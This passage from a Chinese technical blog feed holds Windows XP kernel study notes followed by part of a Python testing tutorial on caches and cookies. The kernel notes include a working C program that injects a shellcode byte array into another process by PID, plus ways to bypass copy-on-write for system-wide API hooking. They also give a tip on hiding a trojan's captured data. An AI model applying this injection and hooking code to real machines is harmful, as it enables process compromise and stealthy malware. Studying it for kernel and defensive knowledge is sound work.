<span class="number">0x04</span>,<span class="number">0x8A</span>,<span class="number">0x03</span>,<span class="number">0xC6</span>,<span class="number">0x89</span>,<span class="number">0x45</span>,<span class="number">0xF4</span>,<span class="number">0x8D</span>,<span class="number">0x45</span>,<span class="number">0xC0</span>,<span class="number">0x50</span>,<span class="number">0x56</span>,<span class="number">0x8B</span>,<span class="number">0x75</span>,<span class="number">0xF4</span>,<span class="number">0xFF</span>,</span><br><span class="line">	<span class="number">0xD6</span>,<span class="number">0x8D</span>,<span class="number">0x4D</span>,<span class="number">0xDC</span>,<span class="number">0x51</span>,<span class="number">0xFF</span>,<span class="number">0xD0</span>,<span class="number">0x8D</span>,<span class="number">0x55</span>,<span class="number">0xD0</span>,<span class="number">0x52</span>,<span class="number">0x50</span>,<span class="number">0xFF</span>,<span class="number">0xD6</span>,<span class="number">0x53</span>,<span class="number">0x8D</span>,</span><br><span class="line">	<span class="number">0x4D</span>,<span class="number">0xB0</span>,<span class="number">0x53</span>,<span class="number">0x51</span>,<span class="number">0x53</span>,<span class="number">0xFF</span>,<span class="number">0xD0</span>,<span class="number">0x5F</span>,<span class="number">0x5E</span>,<span class="number">0x33</span>,<span class="number">0xC0</span>,<span class="number">0x5B</span>,<span class="number">0x8B</span>,<span class="number">0xE5</span>,<span class="number">0x5D</span>,<span class="number">0xC2</span>,</span><br><span class="line">	<span class="number">0x04</span>,<span class="number">0x00</span></span><br><span class="line">	&#125;;</span><br><span class="line"><span class="comment">// 提权函数：提升为DEBUG权限</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	BOOL fOk=FALSE;</span><br><span class="line">	<span class="keyword">if</span>(OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp;</span><br><span class="line">		tp.PrivilegeCount=<span class="number">1</span>;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>,SE_DEBUG_NAME,&amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">		</span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes=SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(hToken,FALSE,&amp;tp,<span class="keyword">sizeof</span>(tp),<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">		</span><br><span class="line">		fOk=(GetLastError()==ERROR_SUCCESS);</span><br><span class="line">		CloseHandle(hToken);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> fOk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//DWORD dwOldProtect;</span></span><br><span class="line">	<span class="comment">//VirtualProtect(ShellCode,0x1000,PAGE_EXECUTE_READWRITE,&amp;dwOldProtect);</span></span><br><span class="line">	EnableDebugPrivilege();</span><br><span class="line">	DWORD dwWritten;</span><br><span class="line">	DWORD pid;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入要注入的进程PID: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pid);</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);</span><br><span class="line">	PVOID pAddr = VirtualAllocEx(hProcess,<span class="number">0</span>,<span class="number">0x1000</span>,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(hProcess,pAddr,ShellCode,<span class="keyword">sizeof</span>(ShellCode),&amp;dwWritten);</span><br><span class="line">	CreateRemoteThread(hProcess,<span class="number">0</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)pAddr,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="comment">//getchar();</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/24/tbeGpgyLBPaDqRS.png" alt="32.png"></p>
<p>注意：如果直接使用如下代码调用ShellCode会失败，是因为此时的ShellCode放在数据段，无可执行权限。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">	call ShellCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解决方法</strong>：可以使用上述的<code>VirtualAllocEx</code>去申请一段可执行的内存块来保存ShellCode，也可以使用<code>VirtualProtect</code>来修改内存页的属性，也可以修改<code>.data</code>节的属性为可读可写可执行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,	<span class="comment">// 目标地址起始位置</span></span></span></span><br><span class="line"><span class="function"><span class="params">DWORD dwSize,		<span class="comment">// 大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">DWORD flNewProtect,	<span class="comment">// 请求的保护方式</span></span></span></span><br><span class="line"><span class="function"><span class="params">PDWORD lpflOldProtect	<span class="comment">// 保存老的保护方式</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>类型</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>PAGE_READONLY</td>
<td>该区域为只读。如果应用程序试图访问区域中的页的时候，将会被拒绝访问</td>
</tr>
<tr>
<td>PAGE_READWRITE</td>
<td>区域可被应用程序读写</td>
</tr>
<tr>
<td>PAGE_EXECUTE</td>
<td>区域包含可被系统执行的代码。试图读写该区域的操作将被拒绝</td>
</tr>
<tr>
<td>PAGE_EXECUTE_READ</td>
<td>区域包含可执行代码，应用程序可以读该区域</td>
</tr>
<tr>
<td><strong>PAGE_EXECUTE_READWRITE</strong></td>
<td>区域包含可执行代码，应用程序可以读写该区域</td>
</tr>
<tr>
<td>PAGE_GUARD</td>
<td>区域第一次被访问时进入一个STATUS_GUARD_PAGE异常，这个标志要和其他保护标志合并使用，表明区域被第一次访问的权限</td>
</tr>
<tr>
<td>PAGE_NOACCESS</td>
<td>任何访问该区域的操作将被拒绝</td>
</tr>
<tr>
<td>PAGE_NOCACHE</td>
<td>RAM中的页映射到该区域时将不会被微处理器缓存（cached)</td>
</tr>
<tr>
<td>PAGE_EXECUTE_WRITECOPY</td>
<td>写拷贝</td>
</tr>
</tbody></table>
<h2 id="4-写拷贝属性（WRITECOPY）"><a href="#4-写拷贝属性（WRITECOPY）" class="headerlink" title="4 写拷贝属性（WRITECOPY）"></a>4 写拷贝属性（WRITECOPY）</h2><p>线性地址写拷贝属性。</p>
<p>每个进程低2G会有块内存，记录哪些线性地址被占用，哪些没有被占用。这块内存是一个二叉树结构，记录某块被申请内存的开始、结束地址，还有为什么被申请。</p>
<p>这个二叉树也叫做<strong>VAD树</strong>，结构如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/24/2uB6Lqsk1ERyYC9.png" alt="33.png"></p>
<p>这棵二叉树在<code>_EPROCESS</code>结构偏移<code>0x11C</code>的位置：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !vad <span class="number">0x8637fd38</span></span><br><span class="line">VAD     level      start      end    commit</span><br><span class="line"><span class="number">86380448</span> ( <span class="number">2</span>)         <span class="number">10</span>       <span class="number">11</span>         <span class="number">2</span> Private      READWRITE         </span><br><span class="line"><span class="number">863</span>eaba0 ( <span class="number">1</span>)         <span class="number">20</span>       <span class="number">20</span>         <span class="number">1</span> Private      READWRITE         </span><br><span class="line">... </span><br><span class="line"><span class="number">86442960</span> ( <span class="number">2</span>)         <span class="number">80</span>       <span class="number">82</span>         <span class="number">0</span> Mapped       READONLY           Pagefile-backed section</span><br><span class="line">...</span><br><span class="line"><span class="number">8613e7</span>c8 ( <span class="number">3</span>)        <span class="number">1b</span>0      <span class="number">1</span>c5         <span class="number">0</span> Mapped       READONLY           \WINDOWS\system32\unicode.nls</span><br><span class="line">...</span><br><span class="line"><span class="number">8635</span>c7d0 ( <span class="number">1</span>)       <span class="number">1000</span>     <span class="number">1008</span>         <span class="number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system32\conime.exe</span><br><span class="line"><span class="number">8612</span>d210 ( <span class="number">7</span>)      <span class="number">58f</span>b0    <span class="number">59179</span>         <span class="number">9</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\AppPatch\AcGenral.dll</span><br><span class="line"><span class="number">863</span>dd088 ( <span class="number">8</span>)      <span class="number">5</span>adc0    <span class="number">5</span>adf6         <span class="number">2</span> Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system32\uxtheme.dll</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<div class="note danger"><p>注意：</p>
<ol>
<li>level：二叉树的级别。</li>
<li>start：开始地址、结束地址使用的单位是4KB（0x1000），如第一项的起始地址为10，即0x10 000。</li>
<li>Private&#x2F;Mapped：该内存是否独占还是和其他进程共享。<ul>
<li>低2G没有非分页（内存属性）之说（不管是公有还是私有，都有可能会被导到文件中），只有高2G才有。</li>
<li><strong>分页和非分页的属性是针对高2G的线性地址</strong>。非分页不过被换页。</li>
<li><strong>独占和共享的属性是针对低2G的线性地址</strong>。</li>
<li>只要通过VirtualAlloc申请的内存都是private。</li>
<li>只有VirtualAlloc和FileMapping才是真正申请内存，malloc–heapalloc只是在VirtualAlloc申请的内存中挂一块驱动。<ul>
<li>VirtualAlloc：申请私有内存</li>
<li>FileMapping：申请共有内存（共享物理页）</li>
</ul>
</li>
</ul>
</li>
<li>READWRITE&#x2F;READONLY&#x2F;EXECUTE_WRITECOPY：线性地址属性。</li>
</ol>
</div>

<h3 id="4-1-内存写入检查流程"><a href="#4-1-内存写入检查流程" class="headerlink" title="4.1 内存写入检查流程"></a>4.1 内存写入检查流程</h3><p>综上：决定一块内存的属性：<mark class="label primary">PDE && PTE && VAD</mark></p>
<p><strong>Mapped Exe描述：</strong></p>
<p>当一个程序通过<code>LoadLibrary</code>进行加载时，此时该文件所在的线性地址空间的属性为Mapped Exe，权限为<code>EXECUTE_WRITECOPY</code>。<br>由于权限为<code>EXECUTE_WRITECOPY</code>的地址空间是需要共享给所有程序使用的，因此当我们对权限为<code>EXECUTE_WRITECOPY</code>的线性地址空间的任何位置进行修改时，系统会先给这块内存重新映射一份物理页，然后再进行修改。</p>
<div class="note default"><p>内存写入检查流程：</p>
<ol>
<li>要写一块内存，如果PDE、PTE是不可写的，那再去查线性地址的属性是否是<code>READONLY</code>，如果是那就说明该内存不可写。</li>
<li>如果线性地址的属性是<code>EXECUTE_WRITECOPY</code>，即写拷贝，这个时候操作系统会重新分配一块物理页（该物理页可读可写），<strong>会把你修改的地方重新复制一份放到新的物理页，并使用新的线性地址指过去。这就是为什么HOOK之后只能影响单独的进程，因为你HOOK的地方已经被放到新的物理页上了！</strong></li>
<li>如果PDE、PTE是可写的，那直接就写了，不管线性地址是否是READONLY（绕过线性地址属性）还是啥。</li>
</ol>
</div>

<p>当你读写某个线性地址：<br>如果物理页属性为只读，CPU会立马进异常，然后查询VAD树，若确实为READONLY，则会返回0xC0000005错误。<br>如果物理页属性为只读，CPU会立马进异常，然后查询VAD树，若确实为EXECUTE_WRITECOPY，则会复制你修改的代码到新的物理页，然后正常返回。</p>
<h3 id="4-2-绕过写拷贝"><a href="#4-2-绕过写拷贝" class="headerlink" title="4.2 绕过写拷贝"></a>4.2 绕过写拷贝</h3><p><strong>方法一</strong>：直接修改该物理页的PDE、PTE属性，改成可写，不会触发异常，也就不会触发写拷贝了。</p>
<p><strong>方法二</strong>：直接修改该地址的 VAD 树，将写拷贝改为可读可写。</p>
<p><strong>方法三</strong>：再申请一块内存，将该内存的PTE指向该物理页，并使<code>PDE_W/R &amp;&amp; PTE_W/R == 1</code>设置属性为可读可写。</p>
<p>举个例子，在Windows XP系统里，MessageBoxA 这个函数位于User32.dll，假如我想HOOK它，比如把它头两个字节的<code>MOV EDI,EDI </code>改成JMP，此时由于 PTE_R&#x2F;W &#x3D; 0，就会触发缺页异常。然后异常处理函数遍历 VAD 树，就会发现 MessageBoxA 的属性是 WriteCopy。此时，如果你对数据进行修改，系统会帮你拷贝一份 MessageBoxA 的代码，然后你的HOOK就只对本进程有效。</p>
<p><strong>总结</strong></p>
<p>1）线性地址分为三类：私有内存 | 共享内存 | 共享文件。<br>2）共享内存和共享文件本质相同，都是分配了一块物理页，不同的是共享文件将物理页和文件关联了起来。<br>3）传统的模块隐藏技术很难在VadRoot中进行隐藏（脱钩可能会导致程序崩溃），除非通过VirtualAlloc分配私有内存，手动将文件进行拉伸与贴入等一系列操作，此时能够大大增加寻找该模块的难度。</p>
<p><img data-src="https://s2.loli.net/2022/01/24/8BliKb271dqvSsI.png" alt="34.png"></p>
<h2 id="5-中级项目1"><a href="#5-中级项目1" class="headerlink" title="5 中级项目1"></a>5 中级项目1</h2><p>这是中级上保护模式和驱动开发章节的综合练习。程序可以监视系统API调用，和三期的那个函数调用监视器不同，三期的只能HOOK本进程的API，而这个项目可以监视所有进程。</p>
<p>当某个API被监控后，无论从哪个程序调用该API，都被HOOK了，都会跳到新的函数中，新的函数执行结束然后返回该API。</p>
<p>本项目的要点技术：</p>
<ol>
<li>先确定监控的API是谁？在哪个模块？</li>
<li>用什么技术达到监控？可以使用DLL注入（开远程线程跳到入口点）、ShellCode注入（开远程线程跳到入口点）、HOOK（Inline注入）等。本项目使用HOOK。</li>
<li><strong>写拷贝</strong>：API函数所在的物理页对应的线性地址属性一般都是写拷贝，则要达到在所有程序中监控该API就必须<strong>对写拷贝进行绕过</strong>。</li>
<li><strong>绕过写拷贝</strong>：根据本项目要求，API的线性地址在每次开机加载后都是一个确定值，可以写改线性地址的属性为READWRITE（该种情况下，仍然会执行一次异常处理，然后CPU才能判断当前的线性地址属性），也可以直接修改PDE、PTE（之后访问内存就不会触发异常）。本项目修改PDE、PTE，则必须要有0环权限才能修改，故需要提权。</li>
<li><strong>中断门提权</strong>：修改PDE、PTE可以使用。</li>
<li><strong>调用门提权</strong>：修改PDE、PTE可以使用。</li>
<li><strong>0环与3环通信</strong>：修改调用门的GDT描述符和IDT描述符，需要使用到函数地址，可以通过通信进行数据传输。</li>
<li><strong>HOOK技术</strong>：通常可以使用<code>E8 CALL</code>、<code>E9 JMP</code>来执行HOOK。但是许多涉及到提权的木马都是直接HOOK API函数起始的前2字节，一般为<code>MOV EDI,EDI</code>（0x8B,0xFF），使用中断门提权时（<code>INT N</code>）刚好也是2字节，直接用来执行HOOK。</li>
<li><strong>保存监控到的数据</strong>：最好是保存到内存中，当应用端需要的时候从内存中读取就好了，尽量避免程序输出文件（保护木马）。</li>
<li><strong>驱动中的全局变量</strong>：在上述第2章有说过，可以使用设备扩展的内存块。</li>
<li>在裸函数内调用 DebugPrint，需要保存FS。</li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
        <category>WinXP驱动</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 测试之道</title>
    <url>/post/learning-testing-with-python/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>

<h2 id="接口测试基础"><a href="#接口测试基础" class="headerlink" title="接口测试基础"></a>接口测试基础</h2><p>从技术的角度来说，把用户发起请求之后的<strong>等待时间</strong>称为<mark class="label info">响应时间</mark>。</p>
<h3 id="1-网络传输知识"><a href="#1-网络传输知识" class="headerlink" title="1 网络传输知识"></a>1 网络传输知识</h3><h4 id="1-1-Cache"><a href="#1-1-Cache" class="headerlink" title="1.1 Cache"></a>1.1 Cache</h4><p>提高反应速度的方法常见的有使用缓存、CDN、优化网页内容加载等。最常用的是使用缓存Cache保存到本地。根据类型来分缓存分为：</p>
<ul>
<li>浏览器缓存</li>
<li>代理缓存</li>
<li>网关缓存</li>
</ul>
<p>根据缓存策略来分：</p>
<ul>
<li>强缓存：直接从本地缓存中取资源，不会和服务器通信。</li>
<li>协商缓存：通过服务器告知是否能用本地缓存。<ul>
<li>先和服务器通信，若返回可以使用本地缓存的指示，再从本地缓存取；</li>
<li>如不可以使用本地缓存，就会返回最新的资源。</li>
</ul>
</li>
</ul>
<p>参考【<a href="https://github.com/frontend9/fe9-interview/issues/29#:~:text=%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E5%88%86%E4%B8%BA%E5%BC%BA%E7%BC%93%E5%AD%98%E5%92%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%EF%BC%8C%E4%B8%A4%E8%80%85%E6%9C%89%E4%B8%A4%E4%B8%AA%E6%AF%94%E8%BE%83%E6%98%8E%E6%98%BE%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9A.%20%E5%A6%82%E6%9E%9C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%91%BD%E4%B8%AD%E5%BC%BA%E7%BC%93%E5%AD%98%EF%BC%8C%E5%88%99%E4%B8%8D%E9%9C%80%E8%A6%81%E7%BB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E8%AF%B7%E6%B1%82%EF%BC%9B%E8%80%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%E6%9C%80%E7%BB%88%E7%94%B1%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%A5%E5%86%B3%E5%AE%9A%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8%E7%BC%93%E5%AD%98%EF%BC%8C%E5%8D%B3%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B9%8B%E9%97%B4%E5%AD%98%E5%9C%A8%E4%B8%80%E6%AC%A1%E9%80%9A%E4%BF%A1%E3%80%82.%20%E5%9C%A8%20chrome%20%E4%B8%AD%E5%BC%BA%E7%BC%93%E5%AD%98%EF%BC%88%E8%99%BD%E7%84%B6%E6%B2%A1%E6%9C%89%E5%8F%91%E5%87%BA%E7%9C%9F%E5%AE%9E%E7%9A%84%20http%20%E8%AF%B7%E6%B1%82%EF%BC%89%E7%9A%84%E8%AF%B7%E6%B1%82%E7%8A%B6%E6%80%81%E7%A0%81%E8%BF%94%E5%9B%9E%E6%98%AF%20200,%E4%BC%9A%E5%88%86%E4%B8%BA%20from%20disk%20cache%20%E5%92%8C%20from%20memory%20cache.">阿里巴巴：浏览器的强缓存和协商缓存（一面）</a>】</p>
<p><img data-src="https://i.loli.net/2020/10/30/i47ltq5M2PzpbSf.png" alt="缓存策略"></p>
<p><img data-src="https://i.loli.net/2020/10/30/uGiFWU8mND9taqn.jpg" alt="IMG_9365.JPG"></p>
<h5 id="1-1-1-浏览器缓存"><a href="#1-1-1-浏览器缓存" class="headerlink" title="1.1.1 浏览器缓存"></a>1.1.1 浏览器缓存</h5><p>使用缓存 Cache 的站点会监听客户端向服务端发出的请求，并根据相应缓存设置保存服务器反馈的数据到本地主机，比如 HTML页面、图片等文件。当下次用户使用相同的 URL 发送请求，请求不会直接发向服务器，而是通过缓存策略先行判断是否使用之前已经保存下来的反馈文件，从而降低服务器的负载及提高数据的响应时间。这样可以节省上网流量。</p>
<h5 id="1-1-2-代理缓存"><a href="#1-1-2-代理缓存" class="headerlink" title="1.1.2 代理缓存"></a>1.1.2 代理缓存</h5><p>由于客户端内存的限制，浏览器缓存不能存放过多的数据，否则会降低本机的性能。在实际应用中，开发者需要缓存大规模的数据及面向更广泛的用户群时，可以使用代理缓存（代理服务器），它使用相同的原理，但可以用相同的方法为几百甚至几千的使用者服务。<strong>总结来说代理缓存比浏览器缓存面向多用户及大规模数据</strong>。</p>
<p>代理缓存是共享缓存的一种，不是只有一个人正在使用它们，而是同时存在大量的用户使用。</p>
<p>代理缓存既不属于客户端，也不属于服务器端，而是利用网络路由请求信息。有以下几种场景：</p>
<ul>
<li>用户手动设置浏览器的代理</li>
<li>使用网页代理，网页代理将你的 URL 请求通过它潜在的网络定向到代理，所以用户甚至无需手动配置它们</li>
</ul>
<h5 id="1-1-3-网关缓存"><a href="#1-1-3-网关缓存" class="headerlink" title="1.1.3 网关缓存"></a>1.1.3 网关缓存</h5><p>网关缓存同样是充当代理的角色，同样起到代理缓存的作用，但是他和代理缓存是有区别的。网关可以为通信线路上的服务器提供不同的协议服务。加入上网线路为：</p>
<ul>
<li><p>代理缓存：$用户\dashrightarrow代理服务器\dashrightarrow服务器$ ，代理服务器与用户和服务器之间使用<strong>相同</strong>的通信协议</p>
</li>
<li><p>网关缓存：$用户\dashrightarrow网关\dashrightarrow服务器$ ，网关与用户和服务器之间可以使用<strong>不相同</strong>的通信协议</p>
</li>
</ul>
<p>网关缓存也是中间人，但不是由系统网络管理员处于节省带宽而部署，它们通常是网站站长部署的，使网站可扩展性、可靠性和性能更好，它可以将请求路由到网关高速缓存，类似于负载均衡器。</p>
<h4 id="1-2-Cookie"><a href="#1-2-Cookie" class="headerlink" title="1.2 Cookie"></a>1.2 Cookie</h4><p>可以用来解决 <mark class="label danger">无状态协议反复认证和身份认证</mark>的的特性。关于无状态协议和有状态协议：</p>
<ul>
<li><a href="https://segmentfault.com/a/1190000017357883">cookie与session详解</a></li>
<li><a href="https://blog.csdn.net/qq_14989227/article/details/78961876?utm_medium=distribute.pc_relevant_bbs_down.none-task-blog-baidujs-1.nonecase&depth_1-utm_source=distribute.pc_relevant_bbs_down.none-task-blog-baidujs-1.nonecase">哪些协议是无状态协议哪些是有状态的，怎么区别？</a></li>
<li><a href="https://www.zhihu.com/question/300560131">如何理解有状态协议和无状态协议？</a></li>
<li><a href="https://blog.csdn.net/zhangvalue/article/details/100635666">http协议是无状态协议</a></li>
<li><a href="https://www.cnblogs.com/bellkosmos/p/5237146.html">http协议无状态中的 “状态” 到底指的是什么？！</a></li>
</ul>
<p>此外还应该关注<mark class="label info">无连接</mark>协议，同时对应 HTTP 报文中的中的<mark class="label success">connect</mark>字段为<mark class="label danger">alive</mark> 或 <mark class="label danger">close</mark></p>
<p>用户浏览器访问一个支持 Cookie 的网站，会经过以下过程（1 2是首次请求访问时选择“保存用户名”，3 4是再次访问）：</p>
<p>（1）客户端  --&gt; 服务器</p>
<p>（2）客户端 （保存Cookie） &lt;-- 服务器（Set-Cookie）</p>
<p>（3）客户端（Cookie）  --&gt; 服务器</p>
<p>（4）客户端   &lt;--  服务器</p>
<h5 id="1-2-1-获取Cookie的途径"><a href="#1-2-1-获取Cookie的途径" class="headerlink" title="1.2.1 获取Cookie的途径"></a>1.2.1 获取Cookie的途径</h5><ol>
<li><p>使用抓包工具，如 BurpSuite 等</p>
</li>
<li><p>浏览器检查网页请求能够获取Cookie</p>
</li>
<li><p>从本地文件中获取</p>
<ul>
<li><p><strong>IE 浏览器</strong>：<code>%APPDATA%\Microsoft\Windows\Cookies\ </code>目录中的<code>xxx.txt</code>文件（里面可能有很多个<code>.txt Cookie</code>文件）</p>
</li>
<li><p><strong>Firefox</strong>：<code>%APPDATA%\Mozilla\Firefox\Profiles\</code> 目录中的<code>xxx.default</code>目录，名为<code>cookies.sqlite</code>的文件。在 Firefox 中查看 cookie，可以选择<code>工具 &gt; 选项 &gt; 隐私 &gt; 显示cookie</code>。</p>
</li>
<li><p><strong>Chrome</strong>：<code>%LOCALAPPDATA%\Google\Chrome\User Data\Default\</code> 目录中，名为<code>Cookies</code>的文件。在 Chrome 中查看 cookie，可以选择<code>设置 &gt; 隐私设置和安全性 &gt; Cookie 及其他网站数据 &gt; 查看所有 Cookie 和网站数据</code>。</p>
<p>在 IE 浏览器中，IE将各个站点的<code>Cookie</code>分别保存为一个<code>XXX.txt</code>这样的纯文本文件（文件个数可能很多，但文件大小都较小）；而 Firefox 和 Chrome 是将所有的<code>Cookie</code>都保存在一个文件中（文件大小较大），该文件的格式为<code>SQLite3</code>数据库格式的文件。</p>
</li>
</ul>
</li>
<li><p>通过前端技术获取</p>
<ul>
<li>可以在浏览器地址栏输入：<code>javascript:alert(document.cookie)</code></li>
</ul>
</li>
</ol>
<h5 id="1-2-2-Cookie的生命周期"><a href="#1-2-2-Cookie的生命周期" class="headerlink" title="1.2.2 Cookie的生命周期"></a>1.2.2 Cookie的生命周期</h5><ol>
<li><strong>默认情况下</strong>：Cookie 数据保存到内存里，当浏览器关闭后，Cookie数据被销毁</li>
<li><strong>持久化存储</strong>： 根据<code>setMaxAge(int seconds)</code>函数的参数来设置：</li>
</ol>
<ul>
<li>正数：将Cookie数据写到硬盘的文件中，持久化存储。并指定Cookie存活时间，时间到后，Cookie文件自动失效。 </li>
<li>负数：默认值，即关闭浏览器后，Cookie即失效 </li>
<li>零：删除Cookie信息，会马上在浏览器上删除指定的cookie</li>
</ul>
<p><code>setMaxAge</code>参数为正数时的情况如下：</p>
<table>
<thead>
<tr>
<th align="center">cookie时间是否到期</th>
<th align="center">重启浏览器</th>
<th align="center">不关闭浏览器</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>cookie时间未到</strong></td>
<td align="center">能访问cookie</td>
<td align="center">能访问cookie</td>
</tr>
<tr>
<td align="center"><strong>cookie时间到</strong></td>
<td align="center">不能访问cookie</td>
<td align="center">能访问cookie</td>
</tr>
</tbody></table>
<p>修改 Cookie 的生命周期的方法：</p>
<ul>
<li>通过浏览器修改</li>
<li>在服务器端的代码层面修改</li>
</ul>
<div class="note info"><p>Cookie 的常用属性：</p>
<ol>
<li><p><strong>Name</strong>：Cookie 的名称。Cookie 一旦创建，名称便不可以修改。</p>
</li>
<li><p><strong>Value</strong>：Cookie 的值。如果值为<code>Unicode</code>字符，需要为字符编码，如果值为二进制数据，则需要使用<code>base64</code>编码</p>
<ul>
<li><p><strong>Unicode编码</strong>：<mark class="label info">保存中文</mark></p>
<p>中文与英文字符不同，中文属于<code>Unicode</code>字符，在内存中占<code>4</code>个字符，而英文属于<code>ASCII</code>字 符，内存中只占<code>2</code>个字节。Cookie 中使用<code>Unicode</code>字符时需要对<code>Unicode</code>字符进行编码，否则会乱码。</p>
</li>
<li><p><strong>Base64编码</strong>：<mark class="label warning">保存二进制图片</mark></p>
<p>Cookie 不仅可以使用<code>ASCII</code>字符与<code>Unicode</code>字符，还可以使用二进制数据。例如，在Cookie中使用数字证书，提供安全度。使用二进制数据时需要进行Base64编码。</p>
</li>
</ul>
</li>
<li><p><strong>Expires&#x2F;Max-Age</strong>：Cookie 失效时间，单位为秒。</p>
<ul>
<li>如果为正数，该 Cookie 会在 MaxAge 秒之后自动失效。</li>
<li>为0时表示立即删除Cookie。</li>
<li>为负数，表示该 Cookie 为临时 Cookie，关闭浏览器即失效，默认值为<code>-1</code>。</li>
</ul>
</li>
<li><p><strong>Secure</strong>：该 Cookie 是否仅被使用安全传输协议传输。安全协议由 HTTPS、SSL等，在网络上传输数据之前先将数据加密，默认是<code>false</code>。</p>
</li>
<li><p><strong>Path</strong>：该 Cookie 的使用路径。</p>
</li>
<li><p><strong>Domain</strong>：可以访问该 Cookie 的域名。如果设置为<code>.google.com</code>，则所有以<code>google.com</code>结尾的域名都可以访问该 Cookie（即它的子域名）。若当前网站是非顶级域名，如二级域名或者三级域名，设置的 Cookie 的<code>domain</code>只能为顶级域名或者二级域名或者三级域名本身，不能设置其他二级域名的 Cookie，否则 Cookie 无法生成。</p>
</li>
<li><p><strong>HttpOnly</strong>：Cookie 的<code>HttpOnly</code> 属性是 Cookie 的扩展功能，它使<code>JavaScript</code> 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（<code>Cross-sitescripting</code>，<code>XSS</code>）对 Cookie 的信息窃取。</p>
</li>
</ol>
</div>

<p>参考：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/27669892">认识HTTP—-Cookie和Session篇</a></li>
<li><a href="https://www.jianshu.com/p/dd73c27ab8d6">Cookie中的SameSite设置</a></li>
</ul>
<h4 id="1-3-Session"><a href="#1-3-Session" class="headerlink" title="1.3 Session"></a>1.3 Session</h4><p>Session 和 Cookie 一样是用来解决无状态协议的，不同的是 Cookie 保存在<mark class="label primary">客户端浏览器</mark>中，而 Session 保存在<mark class="label default">服务器</mark>上。</p>
<p>客户端访问网站带有 Session 的过程：</p>
<p>（1）客户端  --&gt; 服务器</p>
<p>（2）客户端  &lt;-- 服务器（Set-Session 并保存）</p>
<p>（3）客户端（Session）  --&gt; 服务器</p>
<p>（4）客户端   &lt;--  服务器</p>
<p>HTTP协议本身是”无状态”的，在一次请求和下一次请求之间没有任何状态保持，服务器无法识别来自同一用户的连续请求。有了cookie和session，服务器就可以利用它们记录客户端的访问状态了，这样用户就不用在每次访问不同页面都需要登录了。</p>
<p><strong>什么是cookie，cookie的应用场景及缺点</strong></p>
<p>cookie是一种数据存储技术, 它是将一段文本保存在客户端(浏览器或本地电脑)的一种技术，并且可以长时间的保存。当用户首次通过客户端访问服务器时，web服务器会发送给客户端的一小段信息。客户端浏览器会将这段信息以cookie形式保存在本地某个目录下的文件内。当客户端下次再发送请求时会自动将cookie也发送到服务器端，这样服务器端通过查验cookie内容就知道该客户端早访问过了。</p>
<div class="note primary"><p>Cookie 的常见应用场景包括：</p>
<ul>
<li>判断用户是否已经登录</li>
<li>记录用户登录信息(比如用户名，上次登录时间）</li>
<li>记录用户搜索关键词</li>
</ul>
